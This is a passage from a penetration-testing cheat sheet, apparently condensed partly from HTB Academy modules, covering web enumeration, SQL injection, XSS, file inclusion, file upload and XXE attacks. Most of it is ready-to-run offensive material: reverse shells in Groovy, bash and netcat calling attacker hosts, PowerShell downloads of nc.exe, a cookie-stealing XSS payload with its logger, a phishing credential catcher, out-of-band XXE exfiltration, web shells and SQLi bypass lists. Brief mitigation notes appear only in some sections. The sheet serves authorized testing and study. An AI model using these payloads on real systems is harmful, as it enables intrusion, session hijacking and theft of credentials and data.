wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ

# GoBuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

./dirsearch.py -u 10.10.10.157

./dirsearch.py -u http://192.168.101.125:8080 -e html,php,asp,aspx,js,elf,txt -x 404,403,401,500 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

./dirsearch.py -u http://192.168.86.125 -e html,php,asp,aspx,js,elf,txt -x 404,403,401,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10

Crawl:

dirhunt https://url.com/
hakrwaler https://url.com/

Fuzzer:

ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ

dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40

#IIS
#ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

#WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

#ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es

#Jenkins
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

#Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";
#Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Joomscan
joomscan -u  http://10.11.1.111
joomscan -u  http://10.11.1.111 --enumerate-components

# PHP bypass disable_functions and open_basedir
# Chankro
https://github.com/TarlogicSecurity/Chankro
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# Cookies error padding:
# Get cookie structure
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorme'
```

## 21. SQL Injection Fundamentals

> Condensed from HTB Academy **SQL Injection Fundamentals** (module 33).

### MySQL Basics

```bash
mysql -u <USER> -p <PASSWORD> <HOST> -P 3306
```

```sql
SELECT * FROM <TABLE>;
SELECT <COLUMN1>, <COLUMN2> FROM <TABLE>;
SELECT * FROM <TABLE> WHERE <CONDITION>;
SELECT * FROM <TABLE> ORDER BY <COLUMN> [ASC|DESC];
SELECT * FROM <TABLE> LIMIT <N>;
SELECT * FROM <TABLE> LIMIT <OFFSET>, <N>;
SELECT * FROM <TABLE> WHERE <COLUMN> LIKE '<PATTERN>';
```

Common operators: `AND`, `OR`, `NOT`, `=`, `!=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`.

### Authentication Bypass

```sql
-- Vulnerable query: SELECT * FROM users WHERE username='<INPUT>' AND password='<INPUT>';
' OR '1'='1'-- -
' OR 1=1-- -
admin'-- -
' OR '1'='1' #
```

The comment sequence terminates the rest of the original query; the exact comment style depends on the DBMS (`-- -`, `#`, `/* */`).

### UNION Injection

```sql
-- Find the number of columns
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Confirm the display columns
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -

-- Extract data into the visible columns
' UNION SELECT 1,username,password,4 FROM users-- -
```

### Database Enumeration

```sql
SELECT database();
SELECT @@version;
SELECT user();
SELECT current_user();

SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA;
SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>';
SELECT column_name, table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>';
```

```sql
-- Via UNION
' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,table_name,table_schema,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>'-- -
' UNION SELECT 1,column_name,table_name,table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>'-- -
```

### Reading and Writing Files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/index.php');

-- Check the file-import/export restriction
SELECT variable_name, variable_value FROM information_schema.global_variables
WHERE variable_name='secure_file_priv';

-- Write a file (requires FILE privilege and a writable destination)
SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```sql
-- Web shell via UNION
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Mitigations

- Use prepared statements/parameterized queries.
- Apply least privilege to the database account; avoid `FILE` and `SUPER` where possible.
- Validate and allowlist input; escape output.
- Disable detailed SQL errors in production.
- Use a WAF as defense in depth.

### SQL Injection Checks

```
# References
https://portswigger.net/web-security/sql-injection
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://www.exploit-db.com/papers/17934
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://book.hacktricks.xyz/pentesting-web/sql-injection
https://pentestwiki.org/sql-injection/
https://www.tarlogic.com/blog/red-team-tales-0x01/

# Enumeration
' ORDER BY 1--      #Increase the number to determine the number of columns
' UNION SELECT NULL,NULL,NULL--   #Confirm the "Order by" statement
' UNION SELECT NULL,NULL,'a',NULL-- #Define string/numerical data

# Database Attacks
'+UNION+SELECT+@@version,+NULL#
SELECT * FROM information_schema.tables

SHOW GRANTS;  #Get current user permissions

SHOW VARIABLES; #Get variables related to the environment

select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir; #MySQL database enumeration query

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  #List Tables

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  #List Columns

'+UNION+SELECT+username,+password+FROM+users--    #Get Username & Password

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--     #Concatenation for multiple vaules

# SQL Web Shell
'UNION SELECT "<?php echo passthru($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed

# Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)
TrackingId =u5YD3PapBcR4lN3e7Tj4' AND '1'='1    #Test w/ a condition based injection (True or False)

' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs (Time Delay based)

' IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--  #This query uses Boolean to guess the table name of a database

' IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';-- #This query uses Boolean to guess the column name of a table

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a #This query verifies there is table called users.

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  #Checks for password length

TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='§a§  #Use with Burp Sniper, a Simple List Payload, and Grep Match to find the password one character at a time incrementing to total length.

TrackingId =u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm #This query checks to narrow the first letter of the 'Admin' password

# Blind Oracle sqli (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
 TrackingId=Vqg7K1mFWH8hNMMb'||(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username%3d+'administrator')||'  # Used Burp Cluster bomb to iterate through the length of the password and simplelist.

 #Time-Delay SQLi
 TrackingId=jSeXZLJoesz7M9ZH'||pg_sleep(10)--   #The key here is to conactenat the normal query w/ the sleep payload as it is generally processed synchronously by the application.

TrackingId='%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--   # Validate the payload still works for the delay.

TrackingId='%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; # Check for 'administrator' in the 'users' table

TrackingId='%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password) >19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  # Check length of PW.

TrackingId='%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  #Use Sniper to retrieve PW.

# Post
./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
[From Burp to confirm] POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1

sqlmap -r post.login.req --threads=1 --time-sec=1 --level=5 --risk=3 --dbms=mssql -T users -C username,password_hash --random-agent --batch --dump

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - THE GOOD ONE
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=<PASSWORD> --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm --tables --threads 5
# NoSQL
' || 'a'=='a
mongodbserver:port/status?text=1

#in URL
username[$ne]=toto&password[$ne]=toto

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

## SSRF
web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Also we can enum ports
```

### SQL Login Bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### SQL Injection Reference

#### SQL Injection Commands

##### Master List

```shell
';#---              // insert everywhere! Shoutout to xsudoxx!
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

**Authentication Bypass**

```shell
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
' || '1'='1';-- -
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '<NTLM_HASH>
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "<NTLM_HASH>
```

#### SQL Truncation Attack

```shell
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

## 22. Cross-Site Scripting (XSS)

> Condensed from HTB Academy **Cross-Site Scripting (XSS)** (module 103).

### Types

- **Stored XSS** — payload is persisted (comments, profiles, support tickets).
- **Reflected XSS** — payload is reflected from the request (search, error pages).
- **DOM XSS** — client-side JavaScript writes untrusted data into the DOM.

### Test Payloads

```html
<script>alert(window.origin)</script>
<img src=x onerror=alert(window.origin)>
<svg onload=alert(window.origin)>
"><script>alert(window.origin)</script>
'><script>alert(window.origin)</script>
```

Use `window.origin` instead of `alert(1)` to confirm which origin executed the payload. Inspect the DOM to see whether the payload is stored, reflected, or written by JavaScript.

### Discovery

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET>/index.php?task=test"
```

Also test each input/context manually: HTML body, attributes, JavaScript strings, URLs, and DOM sinks.

### Defacing

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://<ATTACKER>/image.png"</script>
<script>document.title = 'Defaced'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Defaced</h1>'</script>
```

### Phishing

Host a fake login page and capture submitted credentials in a controlled lab:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET>/");
    fclose($file);
    exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80
```

### Session Hijacking

Inject a script that sends the victim's cookies to your listener:

```html
<script src="http://<ATTACKER>/script.js"></script>
<script>new Image().src="http://<ATTACKER>/?c="+document.cookie;</script>
```

Cookie logger (`script.js` / `index.php`):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
sudo php -S 0.0.0.0:80
cat cookies.txt
```

Use captured cookies only in the authorized lab; `HttpOnly` cookies are not accessible to JavaScript.

### Prevention

- Context-aware output encoding (HTML, attribute, JavaScript, URL).
- Input validation and allowlists; sanitize rich HTML with DOMPurify.
- Content Security Policy (CSP) to restrict script sources.
- `HttpOnly` and `Secure` cookies; `SameSite` attributes.
- Avoid dangerous sinks (`innerHTML`, `document.write`, `eval`).

### XSS Checks

```
<script>alert("XSS")</script>
<script>alert(1)</script>

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE
XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>Hack The &book;</thp>

Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
%26book%3B</thp>

XXE OOB

<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>
```

## 23. File Inclusion

> Condensed from HTB Academy **File Inclusion** (module 23).

### Local File Inclusion (LFI)

```text
?language=../../../../etc/passwd
?language=....//....//....//etc/passwd
?language=..%2f..%2f..%2f..%2fetc%2fpasswd
?language=/etc/passwd
?language=....\/....\/....\/etc/passwd
```

Bypass filters that strip `../` by repeating or encoding the sequence. Check the application's language/framework behavior (PHP, NodeJS, Java, .NET).

### PHP Filters

```text
?language=php://filter/read=convert.base64-encode/resource=index.php
?language=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
```

```bash
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=config' | base64 -d
```

> https://github.com/synacktiv/php_filter_chain_generator

```shell
python3 php_filter_chain_generator.py --chain '<?= exec($_GET["0"]); ?>'
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec("id"); ?>'
python3 php_filter_chain_generator.py --chain '<?php system("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
python3 php_filter_chain_generator.py --chain '<?php passthru("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"); ?>'
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"
```

```shell
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

```shell
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

```shell
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
```

```shell
curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
```

### PHP Wrappers

```text
# data:// — execute inline PHP (allow_url_include required)
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# php://input — execute POST body
?language=php://input&cmd=id
POST body: <?php system($_GET["cmd"]); ?>

# expect:// — command execution (if the expect extension is loaded)
?language=expect://id
```

### Remote File Inclusion (RFI)

```bash
# Host the shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <PORT>

# Include it
?language=http://<ATTACKER>/shell.php&cmd=id
?language=ftp://<USERNAME>:<PASSWORD>@<ATTACKER>/shell.php&cmd=id
?language=\\<ATTACKER>\share\shell.php&cmd=id
```

RFI requires `allow_url_include=On` (or the relevant wrapper to be enabled). SMB inclusion can work from Windows targets.

### LFI + File Upload

```bash
# GIF/PHP polyglot
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# ZIP archive with a PHP file inside
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# PHAR archive
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Then include the uploaded file with the appropriate wrapper (`zip://`, `phar://`, etc.).

### Log Poisoning

```bash
# Poison a User-Agent field
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<TARGET>/index.php" -H @Poison

# Common logs to include
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/vsftpd.log
/proc/self/environ
```

### Automation

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<TARGET>/index.php?language=FUZZ' -fs <SIZE>

ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://<TARGET>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<TARGET>/index.php?FUZZ=value' -fs <SIZE>
```

### Prevention

- Avoid passing user-controlled paths to include/require functions.
- Use a fixed allowlist of files or map IDs to files.
- Sanitize traversal sequences and use canonical paths.
- Disable `allow_url_include` and unnecessary wrappers.
- Run the web service with least privilege.

### PDF PHP Inclusion

Create a file with a PDF header, which contains PHP code.

```shell
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

```shell
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

### LFI & RFI

```
fimap -u "http://10.11.1.111/example.php?test="

# Ordered output
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=

http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?
?page=php://filter/convert.base64-encode/resource=../config.php

file=C:\windows\system32\drivers\etc\hosts  #Windows file

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

../../../../../boot.ini  #Windows file

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig  #Will work if directory traversal is available.

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config

# RFI over SMB (Windows)
cat php_cmd.php
- Start SMB Server in attacker machine and put evil script
- Access it via browser (2 request attack):
	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
```

## 24. File Upload Attacks

> Condensed from HTB Academy **File Upload Attacks** (module 136).

### Web Shell Upload

```php
<?php system($_REQUEST['cmd']); ?>
```

```asp
<% eval request('cmd') %>
```

```bash
# Reverse shell payload
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.php
nc -lvnp <PORT>
```

```bash
curl 'http://<TARGET>/uploads/shell.php?cmd=id'
```

### Client-Side Validation

- Disable JavaScript or intercept the upload request in Burp/ZAP.
- Change the `Content-Type` and filename after the browser validates them.
- Send the file directly with `curl -F`.

```bash
curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET>/upload.php
```

### Filter Bypasses

- **Blacklist** — try alternate extensions (`.php3`, `.phtml`, `.phar`), case variations, double extensions, trailing dots/spaces, or null bytes on old PHP.
- **Whitelist** — use a double extension or a parser-confusion extension that still executes (verify on the target).
- **Content-Type** — change the multipart `Content-Type` to an allowed image type.
- **Magic bytes** — prepend an image signature (`GIF8`, JPEG header) to a PHP file.
- **Filename** — test path traversal or injection in the filename.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo "this is a text file" > text.jpg
file text.jpg
```

```text
# Content-type examples
image/jpeg
image/png
application/x-php
```

### Limited Uploads

- **SVG** — can contain JavaScript or XXE.
- **Image metadata** — `exiftool` comments can carry XSS payloads.
- **XXE via SVG** — read local files through an external entity.

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### Other Upload Attacks

- Archive uploads (ZIP/TAR) with path traversal.
- `.htaccess` upload to enable PHP execution.
- Filename injection into logs or commands.
- Upload to a publicly accessible directory and execute.

### Prevention

- Allowlist file types and validate content, not just the extension or `Content-Type`.
- Rename uploaded files and store them outside the web root.
- Disable execution in upload directories.
- Set size limits and scan uploads.
- Use a separate domain/CDN for user content.

### Image Upload Filter Bypass

```
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: GIF89a;
- All at the same time.
```

## 25. Web Attacks

> Condensed from HTB Academy **Web Attacks** (module 134).

### HTTP Verb Tampering

```bash
# Discover allowed methods
curl -i -X OPTIONS http://<TARGET>/
curl -i -X TRACE http://<TARGET>/

# Try alternate verbs against an endpoint
curl -i -X HEAD http://<TARGET>/admin
curl -i -X PUT http://<TARGET>/admin
curl -i -X DELETE http://<TARGET>/admin
```

Check whether authentication or authorization is enforced for every method. Some applications only protect `GET`/`POST`.

### Insecure Direct Object References (IDOR)

```bash
# Enumerate object IDs
curl -s "http://<TARGET>/documents.php?uid=1"
curl -s "http://<TARGET>/documents.php?uid=2"

# Extract document links
curl -s "http://<TARGET>/documents.php?uid=3" | grep -oP '\/documents.*?\.pdf'

# Encoded references — try hashes
echo -n 1 | md5sum
echo -n 1 | base64 -w 0 | md5sum
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
# Brute-force a predictable reference
for i in {1..100}; do
  hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')
  curl -sOJ -X POST -d "contract=$hash" http://<TARGET>/download.php
done
```

Test API endpoints and JSON bodies too; IDOR often appears in `GET /api/user/<id>`, `PUT /api/document/<id>`, and nested object IDs.

### XML External Entity (XXE) Injection

Local file disclosure:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
</root>
```

External DTD for advanced disclosure:

```text
<!ENTITY joined "%begin;%file;%end;">
```

Blind OOB exfiltration:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER>:8000/?content=%file;'>">
```

```bash
# Capture the callback
php -S 0.0.0.0:8000
cat Logs/<TARGET>/etc/passwd.log
```

Automation:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

### Prevention

- Disable external entity and DTD processing in XML parsers.
- Enforce object-level authorization on every request, not just the UI.
- Use unguessable IDs and validate ownership server-side.
- Allowlist HTTP methods and enforce auth for every method.
- Use a WAF as defense in depth.

## 26. Windows Privilege Escalation

> Condensed from HTB Academy **Windows Privilege Escalation** (module 67). Lab passwords, hashes, and tokens are omitted; replace placeholders before use.

### Tools

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) — `Invoke-AllChecks`
- [SharpUp](https://github.com/GhostPack/SharpUp) — `SharpUp.exe audit`
- [Seatbelt](https://github.com/GhostPack/Seatbelt) — host enumeration
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
